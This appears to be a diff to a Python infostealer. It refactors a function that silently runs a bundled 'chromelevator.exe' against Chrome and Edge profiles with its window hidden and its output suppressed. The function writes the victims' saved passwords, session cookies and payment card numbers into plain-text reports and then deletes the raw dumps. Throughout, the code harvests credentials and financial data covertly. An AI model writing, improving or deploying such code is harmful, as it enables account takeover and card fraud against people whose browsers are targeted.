@@ -271,9 +271,9 @@ def run_chrome_elevator(browser_name):
 _elevator_ran = False
 def extr_browser():
     """
-    Extract Chrome & Edge data via chromelevator, convert the JSON dumps
-    (passwords, cookies, payments) into .txt reports, and delete the
-    raw .json files so only .txt remain.
+    Extract Chrome & Edge data via chromelevator, convert ALL .json dumps
+    (passwords, cookies, payments) into .txt reports, then delete the raw
+    .json files so only .txt remain.
     """
     global _elevator_ran
     if _elevator_ran:
@@ -282,82 +282,70 @@ def extr_browser():
 
     os.makedirs(EXTRACT_FOLDER, exist_ok=True)
 
-    for short, browser_name in (("chrome", "Chrome"), ("edge", "Edge")):
-        src_dir = BROWSERS.get(browser_name, "")
-        if not os.path.isdir(src_dir):
+    for short_name, browser_label in (("chrome", "Chrome"), ("edge", "Edge")):
+        src_profile_dir = BROWSERS.get(browser_label, None)
+        if not src_profile_dir or not os.path.isdir(src_profile_dir):
             continue
 
-        out_dir = os.path.join(EXTRACT_FOLDER, browser_name)
-        os.makedirs(out_dir, exist_ok=True)
+        dest_root = os.path.join(EXTRACT_FOLDER, browser_label)
+        os.makedirs(dest_root, exist_ok=True)
 
-        # 1) run chromelevator into that folder
+        # 1) Run chromelevator into dest_root
         try:
             subprocess.run(
-                [resource_path("chromelevator.exe"), short, "-o", out_dir],
+                [resource_path("chromelevator.exe"), short_name, "-o", dest_root],
                 check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                 creationflags=CREATE_NO_WINDOW
             )
-        except Exception:
-            with open(os.path.join(out_dir, f"{short}_elevator_error.txt"), "a") as err:
-                err.write(f"{time.ctime()}: chromelevator for {short} failed\n")
+        except Exception as run_err:
+            with open(os.path.join(dest_root, f"{short_name}_elevator_error.txt"), "a") as errf:
+                errf.write(f"{time.ctime()}: elevator failed: {run_err}\n")
             continue
 
-        # 2) for each profile subdir, convert JSON→TXT then delete JSON
-        for profile in os.listdir(out_dir):
-            prof_dir = os.path.join(out_dir, profile)
-            if not os.path.isdir(prof_dir):
-                continue
+        # 2) Walk ALL produced JSON files under dest_root
+        for dirpath, _, filenames in os.walk(dest_root):
+            for fname in filenames:
+                if not fname.lower().endswith(".json"):
+                    continue
 
-            def json_to_txt(fn, header, fmt):
-                jpath = os.path.join(prof_dir, fn + ".json")
-                tpath = os.path.join(prof_dir, fn + ".txt")
-                if not os.path.isfile(jpath):
-                    return
+                jpath = os.path.join(dirpath, fname)
+                base = fname[:-5]         # strip ".json"
+                tpath = os.path.join(dirpath, base + ".txt")
+
                 try:
                     with open(jpath, "r", encoding="utf-8") as jf:
-                        entries = json.load(jf)
+                        data = json.load(jf)
+
+                    # Write header + entries
                     with open(tpath, "w", encoding="utf-8") as tf:
-                        tf.write(f"=== {browser_name} | {profile} → {header} ===\n\n")
-                        for e in entries:
-                            tf.write(fmt(e) + "\n")
+                        tf.write(f"=== {browser_label} | {os.path.relpath(dirpath, dest_root)} → {base.capitalize()} ===\n\n")
+                        for entry in data:
+                            # 3 common types: passwords / cookies / payments
+                            if base == "passwords":
+                                tf.write(f"{entry.get('origin','')} | {entry.get('username','')} | {entry.get('password','')}\n")
+                            elif base == "cookies":
+                                tf.write(f"{entry.get('host','')} | {entry.get('name','')} = {entry.get('value','')}\n")
+                            elif base == "payments":
+                                tf.write(
+                                    f"{entry.get('name_on_card','')} {entry.get('expiration_month','')}/"
+                                    f"{entry.get('expiration_year','')} → {entry.get('card_number','')}\n"
+                                )
+                            else:
+                                # generic fallback: dump full object
+                                tf.write(json.dumps(entry, ensure_ascii=False) + "\n")
+
                 except Exception as parse_err:
-                    # log parse error
-                    with open(os.path.join(prof_dir, f"{fn}_parse_error.log"), "w") as log:
-                        log.write(str(parse_err))
+                    # log parse issues
+                    with open(os.path.join(dirpath, f"{base}_parse_error.log"), "w") as logf:
+                        logf.write(str(parse_err))
+
                 finally:
-                    # remove the raw JSON no matter what
+                    # delete the raw JSON
                     try:
                         os.remove(jpath)
                     except:
                         pass
 
-            json_to_txt(
-                "passwords", "Passwords",
-                lambda e: f"{e.get('origin','')} | {e.get('username','')} | {e.get('password','')}"
-            )
-            json_to_txt(
-                "cookies", "Cookies",
-                lambda e: f"{e.get('host','')} | {e.get('name','')} = {e.get('value','')}"
-            )
-            json_to_txt(
-                "payments", "Payments",
-                lambda e: (
-                    f"{e.get('name_on_card','')} "
-                    f"{e.get('expiration_month','')}/{e.get('expiration_year','')} → "
-                    f"{e.get('card_number','')}"
-                )
-            )
-
-    # 3) ensure no stray .json remain under Chrome/Edge
-    for browser_name in ("Chrome", "Edge"):
-        root = os.path.join(EXTRACT_FOLDER, browser_name)
-        for dirpath, _, files in os.walk(root):
-            for fn in files:
-                if fn.lower().endswith(".json"):
-                    try:
-                        os.remove(os.path.join(dirpath, fn))
-                    except:
-                        pass
 
 
 
